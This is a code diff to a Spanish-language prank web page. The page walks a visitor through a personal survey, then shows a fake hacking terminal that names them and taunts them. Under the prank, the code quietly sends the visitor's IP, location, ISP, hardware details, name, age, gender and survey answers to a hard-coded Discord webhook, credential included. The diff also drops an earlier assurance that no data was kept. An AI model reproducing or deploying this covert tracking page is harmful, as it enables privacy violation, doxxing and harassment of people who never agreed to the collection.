@@ -1,3 +1,9 @@
+// --- ELEMENTOS DEL DOM ---
+const welcomeScreen = document.getElementById('welcome-screen');
+const angryScreen = document.getElementById('angry-screen');
+const survey1 = document.getElementById('survey-1');
+const survey2 = document.getElementById('survey-2');
+const terminalContainer = document.getElementById('terminal-container');
 const consoleContainer = document.getElementById('console');
 const progressContainer = document.getElementById('progress-container');
 const progressFill = document.getElementById('progress-fill');
@@ -6,208 +12,244 @@ const progressText = document.getElementById('progress-text');
 const beepSound = new Audio('beep.mp3.wav');
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533628544129957949/EpuXsjlTzIFjNCDSo_paxbaJc6EREqIYxTGIMNJiUm4inVJcRQjXkcBdhInfPZmGtNmx";
 
-// Evaluación directa e inmediata de la URL
+let ipData = { ip: "Calculando...", city: "Desconocida", country_name: "Desconocido", org: "Local" };
+
 function isModeAdmin() {
     const params = new URLSearchParams(window.location.search);
     const mode = params.get('mode');
     return mode === 'admin' || mode === 'test';
 }
 
-if (isModeAdmin()) {
-    console.log("🛠️ MODO ADMINISTRADOR ACTIVO: Los datos NO se enviarán a Discord.");
-}
+window.onload = async () => {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) { ipData = await res.json(); }
+    } catch (e) {}
+    if (isModeAdmin()) console.log("🛠️ ADMIN: IP cargada en silencio.");
+};
 
-// Bloqueos de navegación
-window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
-document.addEventListener('contextmenu', (e) => e.preventDefault());
+// --- FASE 0: Bienvenida (Sí / No) ---
+document.getElementById('btn-no').addEventListener('click', () => {
+    // Si dice que NO, mostrar mensaje hostil y bloquear la pantalla
+    welcomeScreen.style.display = 'none';
+    angryScreen.style.display = 'flex';
+});
 
-document.getElementById('start-btn').addEventListener('click', async () => {
-    let nameInput = document.getElementById('victim-name').value.trim();
+document.getElementById('btn-yes').addEventListener('click', () => {
+    // Si dice que SÍ, avanzar a la Encuesta 1
+    welcomeScreen.style.display = 'none';
+    survey1.style.display = 'block';
+});
 
-    // Si es admin, omite la validación de nombre obligatorio
-    if (isModeAdmin()) {
-        if (!nameInput) nameInput = "ADMIN_TESTER";
-    } else {
-        if (!nameInput) {
-            alert("Por favor ingresa tu nombre para iniciar la verificación.");
-            return;
-        }
+// --- FASE 1: Datos Básicos ---
+document.getElementById('btn-next').addEventListener('click', () => {
+    const name = document.getElementById('victim-name').value.trim();
+    const age = document.getElementById('victim-age').value.trim();
+    const study = document.getElementById('victim-study').value;
+    const gender = document.getElementById('victim-gender-select').value;
+
+    if (!isModeAdmin() && (!name || !age || study === "Seleccionar" || gender === "Seleccionar")) {
+        alert("Por favor, llena todos los datos para continuar.");
+        return;
     }
 
-    document.getElementById('overlay').style.display = 'none';
+    // Insertar el nombre dinámicamente en el título de la Fase 2
+    document.getElementById('greeting-name').textContent = "Hola " + (name || "Amigo/a");
+
+    survey1.style.display = 'none';
+    survey2.style.display = 'block';
+});
+
+// --- LÓGICA DE LA PREGUNTA 1 (Mostrar/Ocultar "Otro") ---
+document.getElementById('q1-select').addEventListener('change', function() {
+    const otherContainer = document.getElementById('q1-other-container');
+    if (this.value === 'otro') {
+        otherContainer.style.display = 'block';
+    } else {
+        otherContainer.style.display = 'none';
+    }
+});
+
+// --- FASE 2: Finalizar e Iniciar Hackeo ---
+document.getElementById('btn-finish').addEventListener('click', async () => {
+    const q1 = document.getElementById('q1-select').value;
+    const q2 = document.getElementById('q2-select').value;
+    const q3 = document.getElementById('q3-select').value;
+    const q4 = document.getElementById('q4-select').value;
+    const q5 = document.getElementById('q5-text').value.trim();
+
+    if (!isModeAdmin() && (q1 === "Seleccionar" || q2 === "Seleccionar" || q3 === "Seleccionar" || q4 === "Seleccionar")) {
+        alert("Por favor responde las preguntas antes de finalizar.");
+        return;
+    }
+
+    // Transformación visual inmediata a la terminal
+    survey2.style.display = 'none';
+    document.body.style.backgroundColor = '#000000';
+    document.body.style.padding = '0';
+    terminalContainer.style.display = 'flex';
 
     if (document.documentElement.requestFullscreen) {
         document.documentElement.requestFullscreen().catch(() => {});
     }
     if ('Notification' in window && Notification.permission !== 'granted') {
-        await Notification.requestPermission();
+        Notification.requestPermission();
     }
 
-    startHackSimulation(nameInput);
+    finalizeHack();
 });
 
-async function notifyVisit(victimName, ipData, battery, gpu, cpu) {
-    // Verificación de seguridad secundaria antes de enviar a Discord
-    if (isModeAdmin()) {
-        console.log("🚫 [MODO ADMIN] Envío a Discord CANCELADO.");
-        return;
-    }
-
-    if (!DISCORD_WEBHOOK_URL) return;
-
-    const payload = {
-        embeds: [{
-            title: "🎯 ¡NUEVA VÍCTIMA EN LA WEB!",
-            color: 65280,
-            fields: [
-                { name: "👤 Nombre Ingresado", value: victimName || "Anónimo", inline: true },
-                { name: "🌐 IP Pública", value: ipData.ip || "N/A", inline: true },
-                { name: "📍 Ubicación", value: `${ipData.city}, ${ipData.country_name}`, inline: false },
-                { name: "🏢 Proveedor (ISP)", value: ipData.org || "N/A", inline: false },
-                { name: "📱 Dispositivo", value: navigator.platform, inline: true },
-                { name: "🔋 Batería", value: battery, inline: true },
-                { name: "💻 CPU / GPU", value: `${cpu} Cores | ${gpu}`, inline: false }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    };
-
-    try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    } catch (e) {
-        console.log("Error al notificar webhook");
-    }
-}
-
-function getTime() {
-    const d = new Date();
-    return `[${d.toTimeString().split(' ')[0]}]`;
-}
-
+// --- FUNCIONES DE HARDWARE Y RED ---
 function getGPUInfo() {
     try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    } catch (e) {
-        return "Generic/Integrated Graphics";
-    }
+        return gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+    } catch (e) { return "Gráficos Integrados"; }
 }
 
 async function getBatteryInfo() {
     if ('getBattery' in navigator) {
         try {
             const battery = await navigator.getBattery();
-            return `${Math.round(battery.level * 100)}% (${battery.charging ? "AC" : "BAT"})`;
-        } catch (e) {
-            return "N/A";
-        }
+            return `${Math.round(battery.level * 100)}% (${battery.charging ? "Cargando" : "Desconectado"})`;
+        } catch (e) { return "N/A"; }
     }
     return "N/A";
 }
 
-async function startHackSimulation(victimName) {
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const batteryInfo = await getBatteryInfo();
-    const gpuInfo = getGPUInfo();
-    const cpuCores = navigator.hardwareConcurrency || "4";
+function getTime(offsetSeconds = 0) {
+    const d = new Date();
+    d.setSeconds(d.getSeconds() + offsetSeconds);
+    return `[${d.toTimeString().split(' ')[0]}]`;
+}
 
-    let ipData = { ip: "127.0.0.1", city: "Unknown", country_name: "Unset", org: "Local" };
+// --- NOTIFICACIÓN A DISCORD ---
+async function notifyVisit(p) {
+    if (isModeAdmin()) return;
+    if (!DISCORD_WEBHOOK_URL) return;
 
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (res.ok) { ipData = await res.json(); }
-    } catch (e) {}
-
-    await notifyVisit(victimName, ipData, batteryInfo, gpuInfo, cpuCores);
-
-    const logMessages = [
-        { type: "info", text: "Initializing framework core v4.18.0-sys..." },
-        { type: "info", text: "Establishing socket stream on remote endpoint..." },
-        { type: "warn", text: `TARGET IDENTIFIED -> IP: ${ipData.ip} [GEO: ${ipData.city}, ${ipData.country_name}]` },
-        { type: "info", text: `ISP Route: ${ipData.org}` },
-        { type: "info", text: `System Architecture: ${navigator.platform} | CPU Cores: ${cpuCores}` },
-        { type: "info", text: `Display Metrics: ${screenRes} | GPU: ${gpuInfo}` },
-        { type: "info", text: `Power Management Status: ${batteryInfo}` },
-        { type: "warn", text: "Probing heap memory space at 0x7FFF92A0..." },
-        { type: "data", text: "0x7FFF92A0: 4F 6B 2D 80 12 A9 00 FF 34 D1 88 CE 10 A2 FF 01" },
-        { type: "data", text: "0x7FFF92B0: A1 B2 C3 D4 E5 F6 07 18 29 3A 4B 5C 6D 7E 8F 90" },
-        { type: "warn", text: "Injecting payload into primary buffer..." },
-        { type: "alert", text: "CRITICAL: Exfiltrating browser session cookies & local tokens..." }
-    ];
-
-    let messageIndex = 0;
-
-    function printMessage() {
-        if (messageIndex < logMessages.length) {
-            const item = logMessages[messageIndex];
-            const p = document.createElement('p');
-
-            let classType = "log-info";
-            if (item.type === "warn") classType = "log-warn";
-            if (item.type === "alert") classType = "log-alert";
-            if (item.type === "data") classType = "log-data";
-
-            p.innerHTML = `<span class="log-time">${getTime()}</span> <span class="${classType}">${item.text}</span>`;
-
-            consoleContainer.appendChild(p);
-            consoleContainer.scrollTop = consoleContainer.scrollHeight;
-
-            beepSound.currentTime = 0;
-            beepSound.play().catch(() => {});
-
-            if ('vibrate' in navigator) { navigator.vibrate(20); }
-
-            messageIndex++;
-            setTimeout(printMessage, Math.floor(Math.random() * 300) + 100);
-        } else {
-            setTimeout(startProgressBar, 300);
-        }
+    // Procesar respuesta de la Pregunta 1
+    let q1Answer = p.q1;
+    if (p.q1 === 'otro') {
+        q1Answer = p.q1Other || "No especificó";
     }
 
-    function startProgressBar() {
-        progressContainer.style.display = 'block';
-        let progress = 0;
-
-        const interval = setInterval(() => {
-            if (progress < 85) {
-                progress += Math.floor(Math.random() * 8) + 1;
-            } else if (progress < 99) {
-                progress += 1;
-            }
-
-            if (progress > 99) {
-                progress = 99;
-                clearInterval(interval);
-                sendCriticalNotification();
-
-                if ('vibrate' in navigator) {
-                    navigator.vibrate([150, 50, 150, 50, 300]);
+    const payload = {
+        embeds: [{
+            title: "🎯 ¡OBJETIVO COMPROMETIDO!",
+            color: 5763719, // Verde tipo terminal
+            author: {
+                name: "System Override - Reporte de Datos"
+            },
+            fields: [
+                {
+                    name: "👤 PERFIL DE LA VÍCTIMA",
+                    value: `> **Nombre:** ${p.name}\n> **Género:** ${p.gender}\n> **Edad:** ${p.age}\n> **Estudia:** ${p.study}`,
+                    inline: false
+                },
+                {
+                    name: "📋 RESPUESTAS DE LA ENCUESTA",
+                    value: `**¿Qué piensa de ti?**\n> ${q1Answer}\n\n**¿De dónde te conoce?**\n> ${p.q2}\n\n**Si no contestas es porque:**\n> ${p.q3}\n\n**¿Le caes bien?**\n> ${p.q4}`,
+                    inline: false
+                },
+                {
+                    name: "💬 MENSAJE FINAL",
+                    value: `\`\`\`txt\n${p.q5 || "(No dejó ningún mensaje)"}\n\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "📡 RED Y UBICACIÓN",
+                    value: `\`\`\`yaml\nIP:    ${ipData.ip}\nISP:   ${ipData.org || 'Desconocido'}\nLugar: ${ipData.city}, ${ipData.country_name}\n\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "💻 HARDWARE EXTRAÍDO",
+                    value: `\`\`\`yaml\nOS:      ${navigator.platform}\nCPU:     ${p.cpuCores} Núcleos\nBatería: ${p.battery}\nGPU:     ${p.gpu}\n\`\`\``,
+                    inline: false
                 }
+            ],
+            footer: {
+                text: "Extracción silenciosa completada"
+            },
+            timestamp: new Date().toISOString()
+        }]
+    };
 
-                setTimeout(showFinalTroll, 2500);
-            }
+    fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).catch(() => {});
+}
 
-            progressFill.style.width = `${progress}%`;
-            progressText.textContent = `[PROCESS] DUMPING MEMORY TO REMOTE SERVER: ${progress}%`;
-        }, 150);
-    }
+// --- SECUENCIA TERMINAL FINAL ---
+async function finalizeHack() {
+    const pData = {
+        name: document.getElementById('victim-name').value.trim() || "Anónimo",
+        gender: document.getElementById('victim-gender-select').value,
+        age: document.getElementById('victim-age').value.trim() || "N/A",
+        study: document.getElementById('victim-study').value,
+        q1: document.getElementById('q1-select').value,
+        q1Other: document.getElementById('q1-other-text').value.trim(),
+        q2: document.getElementById('q2-select').value,
+        q3: document.getElementById('q3-select').value,
+        q4: document.getElementById('q4-select').value,
+        q5: document.getElementById('q5-text').value.trim(),
+        battery: await getBatteryInfo(),
+        gpu: getGPUInfo(),
+        cpuCores: navigator.hardwareConcurrency || "4"
+    };
 
-    function sendCriticalNotification() {
-        if ('Notification' in window && Notification.permission === 'granted') {
-            new Notification("SYSTEM BREACH ALERT", {
-                body: "Unauthorized memory dump detected on current host.",
-                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
-            });
+    // Enviar a Discord
+    notifyVisit(pData);
+
+    // Inyectar Logs simulando retroactividad
+    consoleContainer.innerHTML = `
+        <p><span class="log-time">${getTime(-55)}</span> <span class="log-info">Connection established. Silent mode active...</span></p>
+        <p><span class="log-time">${getTime(-50)}</span> <span class="log-warn">Background tracing IP: ${ipData.ip} [ISP: ${ipData.org}]</span></p>
+        <p><span class="log-time">${getTime(-48)}</span> <span class="log-info">Hardware fingerprinting: ${navigator.platform} | GPU: ${pData.gpu}</span></p>
+        <p><span class="log-time">${getTime(-35)}</span> <span class="log-warn">Welcome phase bypassed. Inputs intercepted: [${pData.name}, ${pData.age}] -> SAVED</span></p>
+        <p><span class="log-time">${getTime(-5)}</span> <span class="log-warn">Phase 2 text buffers extracted -> SAVED</span></p>
+        <p><span class="log-time">${getTime(0)}</span> <span class="log-alert">CRITICAL EXFILTRATION TRIGGERED BY USER...</span></p>
+    `;
+
+    let progress = 92;
+
+    const attackInterval = setInterval(() => {
+        beepSound.currentTime = 0;
+        beepSound.play().catch(() => {});
+        if ('vibrate' in navigator) navigator.vibrate(50);
+
+        const p = document.createElement('p');
+        p.innerHTML = `<span class="log-time">${getTime()}</span> <span class="log-alert">Uploading packet 0x${Math.floor(Math.random()*16777215).toString(16)} to external server...</span>`;
+        consoleContainer.appendChild(p);
+        consoleContainer.scrollTop = consoleContainer.scrollHeight;
+
+        progress += (Math.random() * 1.5);
+        if (progress >= 99) {
+            progress = 99;
+            clearInterval(attackInterval);
+            finishTroll(pData.name);
         }
+
+        progressFill.style.width = `${progress}%`;
+        progressText.textContent = `[PROCESS] DUMPING MEMORY TO REMOTE SERVER: ${Math.floor(progress)}%`;
+
+    }, 250);
+}
+
+function finishTroll(victimName) {
+    if ('Notification' in window && Notification.permission !== 'granted') {
+        new Notification("SYSTEM BREACH ALERT", {
+            body: "Unauthorized memory dump detected.",
+            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
+        });
     }
 
-    function showFinalTroll() {
+    if ('vibrate' in navigator) navigator.vibrate([200, 100, 200, 100, 500]);
+
+    setTimeout(() => {
         consoleContainer.innerHTML = '';
         progressContainer.style.display = 'none';
 
@@ -215,13 +257,10 @@ async function startHackSimulation(victimName) {
         trollMessage.style.textAlign = 'center';
         trollMessage.style.marginTop = '20%';
         trollMessage.innerHTML = `
-            <p class="log-alert" style="font-size: 20px;">[!] SYSTEM OVERRIDE FAILED</p>
-            <p style="color: #fff; margin-top: 10px;">¡CAÍSTE EN EL TROLEO, ${victimName.toUpperCase()}! 🤖</p>
-            <p style="color: #008833; font-size: 11px; margin-top: 15px;">Ningún dato fue robado ni guardado.</p>
+            <p class="log-alert" style="font-size: 24px; margin-bottom:15px;">[!] TRANSFERENCIA COMPLETADA</p>
+            <p style="color: #fff; font-size: 18px;">¡YA VALISTE, ${victimName.toUpperCase()}! 😈</p>
+            <p style="color: #008833; font-size: 13px; margin-top: 20px;">Tranquilo maje , a nadie le interesa saber que vives en el cerro.</p>
         `;
-
         consoleContainer.appendChild(trollMessage);
-    }
-
-    printMessage();
+    }, 1200);
 }
